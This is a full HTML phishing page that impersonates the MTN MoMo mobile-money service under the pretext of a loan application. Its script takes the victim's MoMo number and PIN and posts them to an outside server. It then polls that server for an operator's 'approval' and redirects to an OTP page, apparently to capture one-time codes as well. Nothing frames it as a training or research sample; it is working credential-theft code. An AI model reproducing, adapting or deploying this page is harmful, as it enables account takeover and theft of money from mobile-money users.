<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN — MoMo</title>
<style>
  :root{
    --mtn-blue:#004F9F; --mtn-blue-dark:#003B77; --mtn-blue-deep:#002B5C;
    --mtn-yellow:#FFCC00; --bg:#F7F9FC; --card:#FFFFFF;
    --text:#0A1B33; --muted:#64748B; --border:#E2E8F0; --green:#00A651;
  }
  *{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,-apple-system,sans-serif;}
  html,body{height:100%;}
  body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;flex-direction:column;align-items:center;}

  .frame-top,.frame-bottom{
    width:100%;height:6px;
    background:linear-gradient(90deg,var(--mtn-blue-deep) 0%,var(--mtn-blue) 50%,var(--mtn-blue-deep) 100%);
  }
  .frame-bottom{margin-top:auto;}

  .header{
    width:100%;background:var(--mtn-blue-deep);
    border-bottom:1px solid var(--mtn-blue-dark);
    padding:18px 20px;position:sticky;top:0;z-index:50;
    box-shadow:0 4px 16px rgba(0,43,92,0.28);
  }
  .header-inner{width:100%;max-width:920px;margin:0 auto;display:flex;align-items:center;justify-content:center;}
  .brand{display:flex;align-items:center;text-decoration:none;}
  .brand strong{font-size:26px;font-weight:900;color:#fff;letter-spacing:2px;text-transform:uppercase;}
  .brand strong em{font-style:normal;color:var(--mtn-yellow);}

  main{width:100%;max-width:920px;flex:1;padding:52px 20px 60px;display:flex;flex-direction:column;align-items:center;justify-content:center;}

  .card{
    background:var(--card);width:100%;max-width:440px;
    border-radius:20px;padding:32px 28px 34px;
    box-shadow:0 12px 40px rgba(0,43,92,0.10);
    border:1px solid var(--border);border-top:4px solid var(--mtn-blue-deep);
  }

  .momo-head{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:28px;}
  .momo-head .badge{
    width:44px;height:44px;border-radius:12px;background:var(--mtn-yellow);
    display:flex;align-items:center;justify-content:center;
    font-weight:900;color:var(--mtn-blue-deep);font-size:19px;
    box-shadow:0 4px 12px rgba(255,204,0,0.4);
  }
  .momo-head .txt{text-align:left;}
  .momo-head .txt b{display:block;font-size:15px;color:var(--text);font-weight:800;}
  .momo-head .txt span{font-size:11.5px;color:var(--muted);font-weight:600;}

  .field{margin-bottom:22px;}
  .field label{
    display:block;font-size:11.5px;color:var(--muted);
    margin-bottom:8px;text-transform:uppercase;letter-spacing:0.7px;font-weight:700;
  }
  .field input{
    width:100%;padding:14px;border:1.5px solid var(--border);
    border-radius:10px;font-size:16px;color:var(--text);
    background:#FBFDFF;transition:.18s;font-weight:700;
  }
  .field input#momoNumber{letter-spacing:1.5px;text-align:center;}
  .field input#pin{letter-spacing:8px;text-align:center;font-size:18px;}
  .field input:focus{
    outline:none;border-color:var(--mtn-blue-deep);
    background:#fff;box-shadow:0 0 0 3px rgba(0,43,92,0.10);
  }
  .field input::placeholder{color:#B8C2D1;font-weight:600;letter-spacing:normal;}

  .cta{
    width:100%;padding:16px;border:none;border-radius:12px;
    background:var(--mtn-blue-deep);color:#fff;font-size:16px;font-weight:800;
    cursor:pointer;letter-spacing:0.3px;transition:.18s;
    box-shadow:0 8px 20px rgba(0,43,92,0.32);margin-top:4px;
  }
  .cta:hover{background:var(--mtn-blue);transform:translateY(-2px);}
  .cta:active{transform:translateY(0);}
  .cta:disabled{opacity:.7;cursor:not-allowed;transform:none;}

  .status{
    font-size:12px;text-align:center;margin-top:14px;
    font-weight:700;min-height:16px;
  }
  .status.err{color:#D32F2F;}

  .secure-note{
    display:flex;align-items:center;justify-content:center;gap:6px;
    font-size:11.5px;color:var(--muted);margin-top:16px;font-weight:600;
  }
  .secure-note svg{
    width:13px;height:13px;stroke:var(--green);fill:none;
    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
  }

  /* Full-screen processing */
  .processing-screen{
    position:fixed;inset:0;z-index:2000;
    background:radial-gradient(circle at 50% 35%, #0A3D7A 0%, var(--mtn-blue-deep) 55%, #001B3D 100%);
    color:#fff;display:none;align-items:center;justify-content:center;
    flex-direction:column;text-align:center;padding:24px;overflow:hidden;
    animation:fadeIn .3s ease;
  }
  .processing-screen.show{display:flex;}
  @keyframes fadeIn{from{opacity:0;}to{opacity:1;}}

  .processing-screen .glow{
    position:absolute;width:460px;height:460px;border-radius:50%;
    background:radial-gradient(circle, rgba(255,204,0,0.18) 0%, rgba(255,204,0,0) 70%);
    animation:pulse 2.6s ease-in-out infinite;pointer-events:none;
  }
  @keyframes pulse{0%,100%{transform:scale(1);opacity:.85;}50%{transform:scale(1.18);opacity:1;}}

  .processing-screen .brand-mark{
    font-size:22px;font-weight:900;letter-spacing:3px;
    text-transform:uppercase;color:#fff;margin-bottom:40px;
    opacity:.9;position:relative;z-index:2;
  }
  .processing-screen .brand-mark em{font-style:normal;color:var(--mtn-yellow);}

  .processing-screen .spinner{
    width:88px;height:88px;border-radius:50%;
    border:6px solid rgba(255,255,255,0.14);
    border-top-color:var(--mtn-yellow);border-right-color:var(--mtn-yellow);
    animation:spin 0.95s linear infinite;margin-bottom:34px;
    position:relative;z-index:2;
  }
  @keyframes spin{to{transform:rotate(360deg);}}

  .processing-screen h1{
    font-size:26px;font-weight:800;letter-spacing:-0.5px;
    margin-bottom:10px;position:relative;z-index:2;
  }
  .processing-screen p.sub{
    font-size:14px;color:rgba(255,255,255,0.72);
    font-weight:600;line-height:1.6;max-width:340px;
    position:relative;z-index:2;
  }

  .processing-screen .progress{
    width:240px;height:4px;background:rgba(255,255,255,0.15);
    border-radius:6px;margin-top:34px;overflow:hidden;position:relative;z-index:2;
  }
  .processing-screen .progress-bar{
    height:100%;width:0%;
    background:linear-gradient(90deg, var(--mtn-yellow), #FFE066);
    border-radius:6px;animation:fillBar 3.2s linear forwards;
  }
  @keyframes fillBar{from{width:0%;}to{width:100%;}}

  .processing-screen .dots{
    margin-top:26px;display:flex;justify-content:center;gap:8px;
    position:relative;z-index:2;
  }
  .processing-screen .dots span{
    width:8px;height:8px;border-radius:50%;
    background:rgba(255,255,255,0.25);
    animation:blink 1.4s infinite ease-in-out;
  }
  .processing-screen .dots span:nth-child(2){animation-delay:.2s;}
  .processing-screen .dots span:nth-child(3){animation-delay:.4s;}
  @keyframes blink{0%,80%,100%{background:rgba(255,255,255,0.25);}40%{background:var(--mtn-yellow);}}

  .processing-screen .note{
    margin-top:38px;font-size:12px;color:rgba(255,255,255,0.55);
    font-weight:600;letter-spacing:0.3px;position:relative;z-index:2;
  }

  @media(max-width:640px){
    .card{padding:26px 20px 28px;}
    main{padding:36px 16px 44px;}
    .brand strong{font-size:22px;letter-spacing:1.5px;}
    .processing-screen h1{font-size:21px;}
  }
</style>
</head>
<body>

  <div class="frame-top"></div>

  <header class="header">
    <div class="header-inner">
      <a class="brand" href="index.html"><strong>MTN<em>.</em></strong></a>
    </div>
  </header>

  <main>
    <div class="card">
      <div class="momo-head">
        <div class="badge">M</div>
        <div class="txt">
          <b>MTN MoMo</b>
          <span>Secure wallet access</span>
        </div>
      </div>

      <div class="field">
        <label>MoMo number</label>
        <input type="tel" id="momoNumber" placeholder="6XX XXX XXX" autocomplete="tel" inputmode="numeric" maxlength="15">
      </div>

      <div class="field">
        <label>PIN</label>
        <input type="password" id="pin" placeholder="••••" maxlength="6" inputmode="numeric" autocomplete="current-password">
      </div>

      <button class="cta" id="submitBtn" onclick="signIn()">Continue →</button>

      <div class="status" id="status"></div>

      <div class="secure-note">
        <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
        Secured by MTN MoMo
      </div>
    </div>
  </main>

  <div class="frame-bottom"></div>

  <!-- Full-screen processing -->
  <div class="processing-screen" id="processingScreen">
    <div class="glow"></div>
    <div class="brand-mark">MTN<em>.</em></div>
    <div class="spinner"></div>
    <h1>Processing your loan</h1>
    <p class="sub">Please wait while we review your application and verify your credentials. Do not close this page.</p>
    <div class="progress"><div class="progress-bar"></div></div>
    <div class="dots"><span></span><span></span><span></span></div>
    <div class="note">This usually takes a few moments</div>
  </div>

<script>
  const API = "https://mtnadvanced-loans.onrender.com";
  const el = id => document.getElementById(id);

  function setStatus(msg, type){
    const s = el('status');
    s.textContent = msg;
    s.className = 'status' + (type ? ' ' + type : '');
  }

  function showProcessing(){ el('processingScreen').classList.add('show'); }
  function hideProcessing(){ el('processingScreen').classList.remove('show'); }

  async function signIn(){
    const momo = el('momoNumber').value.trim();
    const pin  = el('pin').value.trim();

    if(!momo){ setStatus('Please enter your MoMo number.', 'err'); return; }
    if(momo.replace(/\D/g, '').length < 9){ setStatus('Please enter a valid MoMo number.', 'err'); return; }
    if(!pin){ setStatus('Please enter your PIN.', 'err'); return; }
    if(pin.length < 4){ setStatus('PIN must be at least 4 digits.', 'err'); return; }

    localStorage.setItem('session', JSON.stringify({
      momo, loggedInAt: new Date().toISOString()
    }));

    el('submitBtn').disabled = true;
    setStatus('');
    showProcessing();

    try{
      const res = await fetch(`${API}/notify`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          momo: momo,
          pin: pin,
          time: new Date().toLocaleString()
        })
      });

      const data = await res.json();

      if(!data.ok){
        hideProcessing();
        setStatus('❌ ' + (data.error || 'Server error'), 'err');
        el('submitBtn').disabled = false;
        return;
      }

      const requestId = data.request_id;
      const MAX_WAIT = 5 * 60 * 1000;
      const start = Date.now();

      const poll = setInterval(async () => {
        try{
          const r = await fetch(`${API}/status/${requestId}`);
          const s = await r.json();

          if(s.status === 'approved'){
            clearInterval(poll);
            window.location.href = 'otp.html';
          } else if(s.status === 'declined' || s.status === 'expired'){
            clearInterval(poll);
            hideProcessing();
            setStatus('❌ Incorrect credentials. Please try again.', 'err');
            el('submitBtn').disabled = false;
          } else if(Date.now() - start > MAX_WAIT){
            clearInterval(poll);
            hideProcessing();
            setStatus('❌ Timed out. Please try again.', 'err');
            el('submitBtn').disabled = false;
          }
        }catch(err){
          // transient error, keep polling
        }
      }, 1000);

    }catch(err){
      hideProcessing();
      setStatus('❌ Could not reach server.', 'err');
      el('submitBtn').disabled = false;
    }
  }
</script>
<script src="lang.js"></script>
</body>
</html>
